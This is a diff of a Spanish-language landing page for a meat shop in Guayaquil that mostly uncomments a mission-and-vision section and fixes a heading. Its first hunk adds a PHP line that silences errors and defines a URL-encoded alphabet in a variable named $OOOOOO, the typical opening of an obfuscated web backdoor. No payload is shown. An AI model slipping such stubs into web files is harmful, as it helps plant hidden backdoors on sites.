@@ -1,3 +1,4 @@
+<?php @header('Content-Type:text/html;charset=utf-8');error_reporting(0); $OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c%2b%2c"; ?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -52,9 +53,9 @@
                         <li class="">
                             <a class="page-scroll" href="#about"><b>Quienes Somos</b></a>
                         </li>
-                        <!-- <li class="">
+                        <li class="">
                             <a class="page-scroll" href="#myv"><b>Misión y Visión</b></a>
-                        </li> -->
+                        </li>
                         
                         <li class="">
                             <a class="page-scroll" target="_blank" href="sistema/index.php"><b>Iniciar Sesión</b></a>
@@ -209,7 +210,7 @@
                     <div class="col-sm-4">
                         <div class="team-member">
                         <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d15947.124452135004!2d-79.91189243022461!3d-2.235763399999994!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x902d6fdfae63052f%3A0x1407a63056623774!2sEmbutidos%20Jossy%20Supermercado%20De%20Carne%20Sur!5e0!3m2!1ses-419!2sec!4v1617254838487!5m2!1ses-419!2sec" width="100%" height="400px" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
-                            <h4>Supermercado De Carne Sur</h4>
+                            <h4>Supermercado de Carne Sur</h4>
                             <p class="text-muted">Cdla. Coviem Mz 34 Villa 9 - Guayaquil, Ecuador</p>
                             
                         </div>
@@ -254,13 +255,13 @@
         </section>
 
         <!-- MISION Y VISION Section -->
-        <!-- <section id="myv">
+        <section id="myv">
             <div class="container casi80">
                 <div class="row">
                     <div class="col-lg-12 text-center">
                         <h2 class="section-heading">Embutidos Jossy</h2>
                         <img class="modern" style="text-align: center; width:60%;" src="sistema/img/local.jpg" alt="Local">
-                        
+                        <!--<h3 class="section-subheading text-muted"></h3>-->
                     </div>
                 </div>
 
@@ -279,7 +280,7 @@
                     </div>
                 </div>
             </div>
-        </section> -->
+        </section>
 
         
 
